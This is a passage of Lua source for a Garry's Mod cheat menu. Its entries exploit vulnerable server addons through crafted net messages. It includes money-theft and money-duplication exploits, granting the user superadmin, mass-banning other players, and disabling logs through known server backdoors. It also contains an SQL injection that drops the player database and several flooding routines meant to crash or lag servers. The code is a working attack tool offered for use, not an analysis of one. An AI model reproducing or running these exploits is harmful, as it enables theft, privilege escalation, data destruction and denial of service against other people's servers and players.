iZNX.NetStart("BuyCrate")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Get Weapon", {
desc = "Exploit на получение оружия",
severity = 1,
scan = function() return iZNX.ValidNetString( "MONEY_SYSTEM_GetWeapons" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем оружие")
for i = 1,32 do
iZNX.NetStart("MONEY_SYSTEM_GetWeapons")
net.WriteInt(i, 8)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "Demote Exploit", {
desc = "Exploit на увольнение всех людей на сервере",
severity = 1,
scan = function() return iZNX.ValidNetString( "MCon_Demote_ToServer" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Увольняем")
for k,v in pairs(player.GetAll()) do
iZNX.NetStart("MCon_Demote_ToServer")
net.WriteString(v:SteamID())
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "€ Printers Money Stealer # €", {
desc = "Exploit на воровство денег с чужих принтеров",
severity = 1,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons16690" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_money" ) then
iZNX.ChatText( "Воруем чужие деньги" )
timer.Create( "Defqon_exploit_money", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
iZNX.NetStart( "SyncPrinterButtons16690" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "Defqon_exploit_money" )
iZNX.ChatText( "Прекращаем воровать" )
end
end, },
},
} )
iZNX.AddExploit( "€ Derma Printers Money Stealer €", {
desc = "Exploit на воровство денег с чужих принтеров",
severity = 1,
scan = function() return iZNX.ValidNetString( "withdrawp" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Воруем - "..#ents.FindByClass("derma_printer").." шт.")
for k,v in pairs(ents.FindByClass("derma_printer")) do
net.Start("withdrawp")
net.WriteEntity(v)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "€ Money Exploit €", {
desc = "DarkRP_SS_Gamble",
severity = 1,
scan = function() return iZNX.ValidNetString( "DarkRP_SS_Gamble" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "DarkRP_SS_Gamble" )
net.WriteInt(50000, 32)
net.WriteInt(1, 32)
net.WriteInt(0, 32)
net.WriteInt(0, 32)
net.WriteInt(1, 32)
net.SendToServer()
end }
}
})
iZNX.AddExploit( "TestPromoCode", {
desc = "что-то связаное с компами, хз",
severity = 1,
scan = function() return iZNX.ValidNetString( "PCAdd" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "PCAdd" )
net.WriteString("alahman")
net.WriteString("300000000")
net.SendToServer()
timer.Simple(3,function()
iZNX.NetStart("ActivatePC")
net.WriteString("alahman")
net.SendToServer()
iZNX.NetStart("PCDelAll")
net.SendToServer()
end
)
end}
}
}
)
--[[ TO FIX!!! -------------------------------------------------------------------
iZNX.AddExploit( "Disguise/Маскировка #2", {
desc = "DarkRP_SS_Gamble",
severity = 1,
scan = function() return iZNX.ValidNetString( "DarkRP_SS_Gamble" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText( "Тадам" )
end }
}
})
----------------------------------------------------------------------------------]]
iZNX.AddExploit( "Ulx Console Flood", {
desc = "Обычный ulx flood в консоль",
severity = 1,
scan = function() return ulx end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if ulxflood then
hook.Remove("Think", "FloodULX")
ulxflood = false
else
hook.Add("Think", "FloodULX", function()
LocalPlayer():ConCommand("_u Seized")
end)
ulxflood = true
end
iZNX.ChatText("UlxFlood - "..tostring(ulxflood))
end }
}
}
)
iZNX.AddExploit( "HL2RP Disp", {
desc = "Запускает одну голосовую команду, по типу коменданского часа (как в hl2)",
severity = 1,
scan = function() return iZNX.ValidNetString( "viv_hl2rp_disp_message" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText( "Запускаем" )
for name, command in pairs (dispatchCommands) do
iZNX.NetStart("viv_hl2rp_disp_message")
net.WriteString(command)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "HL2RP Disp Flood", {
desc = "Запускает много голосовых команд, по типу коменданского часа (как в hl2)",
severity = 1,
scan = function() return iZNX.ValidNetString( "viv_hl2rp_disp_message" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText( "Flood - on" )
if not timer.Exists("HL2RPFLOOD") then
timer.Create("HL2RPFLOOD", 0, 0, function()
for name, command in pairs (dispatchCommands) do
iZNX.NetStart("viv_hl2rp_disp_message")
net.WriteString(command)
net.SendToServer()
end
end
)
else
timer.Remove("HL2RPFLOOD")
iZNX.ChatText( "Flood - off" )
end
end }
}
}
)
iZNX.AddExploit( "Easter Egg", {
desc = "Находит пасхальные яйца",
severity = 1,
scan = function() return iZNX.ValidNetString( "egg" ) end,
functions = {
{ typ = "func", name = "1 яйцо", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
RunConsoleCommand("say", "4bigz")
end, },
{ typ = "func", name = "2 яйцо", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
RunConsoleCommand("cc_egg2")
end, },
{ typ = "func", name = "3 яйцо", func = function()
iZNX.NetStart("egg")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Атака нулевого дня #1", {
desc = "Вызывает моментальный сбой в работе системы и сервер крашится к чертям",
severity = 1,
scan = function() return iZNX.ValidNetString( "Sbox_gm_attackofnullday" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
RunConsoleCommand("gm_attackofnullday")
end, },
},
} )
iZNX.AddExploit( "Атака нулевого дня #2", {
desc = "Выдает вам суперадминку",
severity = 1,
scan = function() return iZNX.ValidNetString( "Sbox_gm_attackofnullday_key" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText( "Выдаем админку" )
iZNX.NetStart("Sbox_gm_attackofnullday_key")
net.WriteString( "ulx adduser \""..lp:Nick().."\" superadmin" )
net.WriteBit(0)
net.SendToServer()
RunConsoleCommand("gm_attackofnullday")
end, },
},
} )
iZNX.AddExploit( "Toggle TTT Report Bypass", {
desc = "TTT Report Bypass",
severity = 1,
scan = function() return isttt end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if bypass == 0 then
	            hook.Add("Think", "remove_ttt_report", function()
	                local pan = vgui.GetHoveredPanel()
	                CheckChild(pan)
	            end)

	            iZNX.ChatText("Report Bypass включен")
	            bypass = 1
	        else
	            hook.Remove("Think", "remove_ttt_report")
	            iZNX.ChatText("Report Bypass выключен")
	            bypass = 0
end
end }
}
}
)

--[[ ------------------------------------------------------------------------------------------------------------------------------------
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   OLD SHIT   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-----------------------------------------------------------------------------------------------------------------------------------------]]
iZNX.AddExploit( "€ Customizable Printers Money Stealer €", {
desc = "Мгновенно крадет все деньги от каждого принтера на сервере",
severity = 3,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_shekels" ) then
iZNX.ChatText( "Воруем чужие деньги" )
timer.Create( "Defqon_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
iZNX.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "Defqon_exploit_shekels" )
iZNX.ChatText( "Прекращаем воровать" )
end
end, },
},
} )
iZNX.AddExploit( "ULX Friends Spam", {
desc = "Спам сообщением на сервере",
severity = 1,
scan = function() return (iZNX.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Введите сообщение", default = "FUCK YOU", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "bigspams" ) then
iZNX.ChatText( "Начинаем спам" )
timer.Create( "bigspams", 0.5, 0, function()
local t = iZNX.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, iZNX.GetStored( "fr_spamstring", "FUCK YOU" ) )
end
iZNX.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
iZNX.ChatText( "Прекращаем спам" )
end
end, },
},
} )
iZNX.AddExploit( "Console Error Spammer", {
desc = "(Поражение rcon сервера массовыми ошибками)",
severity = 1,
scan = function() return iZNX.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_errorz" ) then
iZNX.ChatText( "Error спам запущен" )
timer.Create( "Defqon_exploit_errorz", 0.1, 0, function()
iZNX.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "Defqon_exploit_errorz" )
iZNX.ChatText( "Error спам остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Turbo Error Spammer", {
desc = "Поражение rcon сервера массовыми ошибками",
severity = 2,
scan = function() return iZNX.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_errorzt" ) then
iZNX.ChatText( "Error спам запущен" )
timer.Create( "Defqon_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
iZNX.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_errorzt" )
iZNX.ChatText( "Error спам остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "€ Kun Drug €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_selldrugon" ) then
iZNX.ChatText( "Exploit запущен" )
timer.Create( "Defqon_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
iZNX.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_selldrugon" )
iZNX.ChatText( "Exploit остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Point Shop Unbox", {
desc = "Exploit, связанный с аддоном Point Shop",
severity = 2,
scan = function() return iZNX.ValidNetString( "net_PSUnBoxServer" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do
if !v:PS_HasItem(v2.ID) then
timer.Simple(k*i*1.7,function()
iZNX.NetStart("net_PSUnBoxServer")
net.WriteEntity(v)
net.WriteString(v2.ID)
net.SendToServer()
end)
i = i + 1
end
end
end
end, },
},
} )
iZNX.AddExploit( "☢ PatchPlay Give Superadmin ☢", {
desc = "Выдача супер админки (нужен перезаход на сервер!)",
severity = 1,
scan = function() return iZNX.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
iZNX.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
iZNX.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "Выдана супер админка "..v:Nick() )
end
end, },
},
} )
local thefrenchenculer = ""
if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
thefrenchenculer = "Sandbox_ArmDupe"
else
if iZNX.ValidNetString( "Sbox_darkrp" ) then
thefrenchenculer = "Sbox_darkrp"
else
if iZNX.ValidNetString( "Sbox_itemstore" ) then
thefrenchenculer = "Sbox_itemstore"
else
if iZNX.ValidNetString( "Ulib_Message" ) then
thefrenchenculer = "Ulib_Message"
else
if iZNX.ValidNetString( "ULogs_Info" ) then
thefrenchenculer = "ULogs_Info"
else
if iZNX.ValidNetString( "ITEM" ) then
thefrenchenculer = "ITEM"
else
if iZNX.ValidNetString( "fix" ) then
thefrenchenculer = "fix"
else
if iZNX.ValidNetString( "Fix_Keypads" ) then
thefrenchenculer = "Fix_Keypads"
else
if iZNX.ValidNetString( "Remove_Exploiters" ) then
thefrenchenculer = "Remove_Exploiters"
else
if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
thefrenchenculer = "noclipcloakaesp_chat_text"
else
if iZNX.ValidNetString( "_Defqon" ) then
thefrenchenculer = "_Defqon"
else
if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
thefrenchenculer = "_CAC_ReadMemory"
else
if iZNX.ValidNetString( "nostrip" ) then
thefrenchenculer = "nostrip"
else
if iZNX.ValidNetString( "nocheat" ) then
thefrenchenculer = "nocheat"
else
if iZNX.ValidNetString( "LickMeOut" ) then
thefrenchenculer = "LickMeOut"
else
if iZNX.ValidNetString( "ULX_QUERY2" ) then
thefrenchenculer = "ULX_QUERY2"
else
if iZNX.ValidNetString( "ULXQUERY2" ) then
thefrenchenculer = "ULXQUERY2"
else
if iZNX.ValidNetString( "MoonMan" ) then
thefrenchenculer = "MoonMan"
else
if iZNX.ValidNetString( "Im_SOCool" ) then
thefrenchenculer = "Im_SOCool"
else
if iZNX.ValidNetString( "Sandbox_GayParty" ) then
thefrenchenculer = "Sandbox_GayParty"
else
if iZNX.ValidNetString( "DarkRP_UTF8" ) then
thefrenchenculer = "DarkRP_UTF8"
else
if iZNX.ValidNetString( "oldNetReadData" ) then
thefrenchenculer = "oldNetReadData"
else
if iZNX.ValidNetString( "memeDoor" ) then
thefrenchenculer = "memeDoor"
else
if iZNX.ValidNetString( "BackDoor" ) then
thefrenchenculer = "BackDoor"
else
if iZNX.ValidNetString( "OdiumBackDoor" ) then
thefrenchenculer = "OdiumBackDoor"
else
if iZNX.ValidNetString( "SessionBackdoor" ) then
thefrenchenculer = "SessionBackdoor"
else
if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
thefrenchenculer = "DarkRP_AdminWeapons"
else
if iZNX.ValidNetString( "cucked" ) then
thefrenchenculer = "cucked"
else
if iZNX.ValidNetString( "NoNerks" ) then
thefrenchenculer = "NoNerks"
else
if iZNX.ValidNetString( "kek" ) then
thefrenchenculer = "kek"
else
if iZNX.ValidNetString( "ZimbaBackDoor" ) then
thefrenchenculer = "ZimbaBackDoor"
else
if iZNX.ValidNetString( "something" ) then
thefrenchenculer = "something"
else
if iZNX.ValidNetString( "random" ) then
thefrenchenculer = "random"
else
if iZNX.ValidNetString( "strip0" ) then
thefrenchenculer = "strip0"
else
if iZNX.ValidNetString( "fellosnake" ) then
thefrenchenculer = "fellosnake"
else
if iZNX.ValidNetString( "enablevac" ) then
thefrenchenculer = "enablevac"
else
if iZNX.ValidNetString( "idk" ) then
thefrenchenculer = "idk"
else
if iZNX.ValidNetString( "c" ) then
thefrenchenculer = "c"
else
if iZNX.ValidNetString( "killserver" ) then
thefrenchenculer = "killserver"
else
if iZNX.ValidNetString( "fuckserver" ) then
thefrenchenculer = "fuckserver"
else
if iZNX.ValidNetString( "cvaraccess" ) then
thefrenchenculer = "cvaraccess"
else
if iZNX.ValidNetString( "rcon" ) then
thefrenchenculer = "rcon"
else
if iZNX.ValidNetString( "rconadmin" ) then
thefrenchenculer = "rconadmin"
else
if iZNX.ValidNetString( "web" ) then
thefrenchenculer = "web"
else
if iZNX.ValidNetString( "jesuslebg" ) then
thefrenchenculer = "jesuslebg"
else
if iZNX.ValidNetString( "zilnix" ) then
thefrenchenculer = "zilnix"
else
if iZNX.ValidNetString( "Þà?D)◘" ) then
thefrenchenculer = "Þà?D)◘"
else
if iZNX.ValidNetString( "disablebackdoor" ) then
thefrenchenculer = "disablebackdoor"
else
if iZNX.ValidNetString( "kill" ) then
thefrenchenculer = "kill"
else
if iZNX.ValidNetString( "DefqonBackdoor" ) then
thefrenchenculer = "DefqonBackdoor"
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
iZNX.AddExploit( ".NET Backdoor", {
desc = "Найден .net backdoor: "..thefrenchenculer.."",
severity = 1,
scan = function() return iZNX.ValidNetString( thefrenchenculer ) end,
functions = {
{ typ = "func", name = "Отключить логи", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },
{ typ = "func", name = "Toxic.pro", func = function()
iZNX.Menu:Remove()
RunConsoleCommand( "toxic.pro" )
end, },
{ typ = "htxcommandeliste", name = "Список команд" },
{ typ = "soundboard", name = "SoundBoard" },
{ typ = "players", addr = "give_superadmins" },
{ typ = "func", name = "Superadmin", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "ulx adduserid "..id.." superadmin" )
net.WriteBit(false)
net.SendToServer()
end
end, },
{ typ = "func", name = "Забанить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "ulx banid "..id.." 0 nudop udu Haxyu" )
net.WriteBit(false)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "☢ Трахнуть базу данных SQL ☢", {
desc = "Уничтожение базы данных darkrp master, стирая все данные игроков, вы должны быть супер админом !!",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
iZNX.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "База данных SQL Server уничтожена" )
end, },
},
} )
iZNX.AddExploit( "Уничтожить данные сервера", {
desc = "Уничтожение данных сервера, вероятно будет бесить одменов)",
severity = 3,
scan = function() return iZNX.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_datatrasher" ) then
iZNX.ChatText( "Запуск спама в данные сервера" )
timer.Create( "Defqon_exploit_datatrasher", 0.5, 0, function()
iZNX.NetStart( "WriteQuery" )
net.WriteString( "LOL" )
net.SendToServer()
end)
else
timer.Remove( "Defqon_exploit_datatrasher" )
iZNX.ChatText( "Прекращение спама" )
end
end, },
},
} )
iZNX.AddExploit( "[NEW] Broadcast", {
desc = "Большой спам, очень скучный",
severity = 1337,
scan = function() return iZNX.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "Введите сообщение", default = "DefqonMenu", addr = "vj_string" },
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Broadcasting")
iZNX.NetStart("VJSay")
net.WriteEntity(nil)
net.WriteString( iZNX.GetStored( "vj_string" ) )
net.WriteString("")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Give weapons", {
desc = "Exploit дает вам гребаное оружие | Большой шанс неработоспособности",
severity = 3,
scan = function() return iZNX.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Тип оружия", default = "ls_sniper", addr = "armes_a_prendre" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( iZNX.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "ULX Extended ", {
desc = "Осторожно! Этот эксплойт опасен, если аддон обновлен вы будете кикнуты",
severity = 3,
scan = function() return iZNX.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Забанить админов", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro
if v != LocalPlayer() then
iZNX.NetStart("banleaver")
net.WriteString(v:SteamID().."{sep}".."bb")
net.SendToServer()
end
end
end
end, },
{ typ = "func", name = "Забанить всех", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
iZNX.NetStart("banleaver")
net.WriteString(v:SteamID().."{sep}".."bb")
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "€ Casino NPC €", {
desc = "Exploit на очень эффективные деньги, купим шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( -iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ ATM €", {
desc = "Exploit на деньги, идем покупать шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "ATMDepositMoney" )
net.WriteFloat( -iZNX.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "TAXI Spawn Lag", {
desc = "Exploit чтобы ссать на процессоры кодеров ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Спавн", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("The addons leaks is full of feat :D")
net.SendToServer()
end, },
{ typ = "func", name = "Супер спам", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "taxispam" ) then
iZNX.ChatText( "Спам спавном такси запущен" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("The addons leaks is full of feat :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
iZNX.ChatText( "Спам спавном такси прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "€ eMining €", {
desc = "Exploit на деньги ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = -iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Снять", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("Upgrade")
net.WriteTable( { LuaName = v.LuaName, Amount = iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "€ Gamble NPC €", {
desc = "Exploit на бессконечные деньги, купим шлюх и кокс ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Kun Oil Mod €", {
desc = "Exploit на деньги, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Join the Police 1", {
desc = "Вступление в полицию, не одевая эту гребаную форму",
severity = 2,
scan = function() return iZNX.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Вступить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("PoliceJoin")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Join the Police 2", {
desc = "Вступление в полицию, не одевая эту гребаную форму",
severity = 2,
scan = function() return iZNX.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Вступить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Deposit Money €", {
desc = "Exploit на деньги с ATM банкоматом",
severity = 2,
scan = function() return iZNX.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
swag = v
end
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-iZNX.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "MDE", {
desc = "Exploit для удаления PermaProps (Наведите на проп и нажмите на кнопку, чтобы удалить его)",
severity = 2,
scan = function() return iZNX.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Удалить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ SS Shelf NET €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do
swag = v
end
iZNX.NetStart( 'NET_SS_DoBuyTakeoff' )
net.WriteEntity(LocalPlayer())
